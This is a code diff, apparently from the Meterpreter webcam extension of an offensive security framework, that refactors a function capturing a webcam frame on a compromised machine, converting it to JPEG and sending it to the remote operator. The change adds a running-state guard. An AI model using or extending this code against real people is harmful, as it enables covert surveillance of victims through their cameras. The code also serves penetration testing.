@@ -342,45 +342,49 @@ DWORD request_webcam_get_frame(Remote *remote, Packet *packet){
 	DWORD dwResult = ERROR_SUCCESS;
 	UINT quality = packet_get_tlv_value_uint(packet, TLV_TYPE_WEBCAM_QUALITY);
 	
-	//Make bmp
-	BITMAPFILEHEADER	bfh;
-	bfh.bfType = 0x4d42;	// always "BM"
-	bfh.bfSize = sizeof( BITMAPFILEHEADER );
-	bfh.bfReserved1 = 0;
-	bfh.bfReserved2 = 0;
-	bfh.bfOffBits = (DWORD) (sizeof( bfh ) + sizeof(BITMAPINFOHEADER));
+	do{
+		if(!running)
+			BREAK_WITH_ERROR("Not running!", ERROR_INVALID_ACCESS)
+		//Make bmp
+		BITMAPFILEHEADER	bfh;
+		bfh.bfType = 0x4d42;	// always "BM"
+		bfh.bfSize = sizeof( BITMAPFILEHEADER );
+		bfh.bfReserved1 = 0;
+		bfh.bfReserved2 = 0;
+		bfh.bfOffBits = (DWORD) (sizeof( bfh ) + sizeof(BITMAPINFOHEADER));
 
-	BITMAPINFOHEADER bih;
-	bih.biSize = sizeof(BITMAPINFOHEADER);
-	bih.biWidth = nWidth;
-	bih.biHeight = nHeight;
-	bih.biPlanes = 1;
-	bih.biBitCount = 24;
-	bih.biCompression = BI_RGB;
-	bih.biSizeImage = imgsize;
-	bih.biXPelsPerMeter = 0;
-	bih.biYPelsPerMeter = 0;
-	bih.biClrUsed = 0;
-	bih.biClrImportant = 0;
+		BITMAPINFOHEADER bih;
+		bih.biSize = sizeof(BITMAPINFOHEADER);
+		bih.biWidth = nWidth;
+		bih.biHeight = nHeight;
+		bih.biPlanes = 1;
+		bih.biBitCount = 24;
+		bih.biCompression = BI_RGB;
+		bih.biSizeImage = imgsize;
+		bih.biXPelsPerMeter = 0;
+		bih.biYPelsPerMeter = 0;
+		bih.biClrUsed = 0;
+		bih.biClrImportant = 0;
 
-	UINT mybmpsize = imgsize + sizeof(bfh) + sizeof(bih);
-	if(bmpsize < mybmpsize){
-		bmpsize = mybmpsize;
-		if(bmpdata != NULL)
-			delete [] bmpdata;
-		bmpdata = new BYTE[bmpsize];
-	}
+		UINT mybmpsize = imgsize + sizeof(bfh) + sizeof(bih);
+		if(bmpsize < mybmpsize){
+			bmpsize = mybmpsize;
+			if(bmpdata != NULL)
+				delete [] bmpdata;
+			bmpdata = new BYTE[bmpsize];
+		}
 
-	// put headers together to make a .bmp in memory
-	memcpy(bmpdata, &bfh, sizeof(bfh));
-	memcpy(bmpdata + sizeof(bfh), &bih, sizeof(bih));
-	memcpy(bmpdata + sizeof(bfh) + sizeof(bih), imgdata, imgsize);
+		// put headers together to make a .bmp in memory
+		memcpy(bmpdata, &bfh, sizeof(bfh));
+		memcpy(bmpdata + sizeof(bfh), &bih, sizeof(bih));
+		memcpy(bmpdata + sizeof(bfh) + sizeof(bih), imgdata, imgsize);
 
-	// Now convert to JPEG
-	bmp2jpeg(bmpdata, quality, &jpgarray, &jpgsize );
+		// Now convert to JPEG
+		bmp2jpeg(bmpdata, quality, &jpgarray, &jpgsize );
 
-	//And send
-	packet_add_tlv_raw(response, TLV_TYPE_WEBCAM_IMAGE, jpgarray, jpgsize);
+		//And send
+		packet_add_tlv_raw(response, TLV_TYPE_WEBCAM_IMAGE, jpgarray, jpgsize);
+	}while(0);
 	packet_transmit_response(dwResult, remote, response);
 
 	PBYTE tmparray = jpgarray;
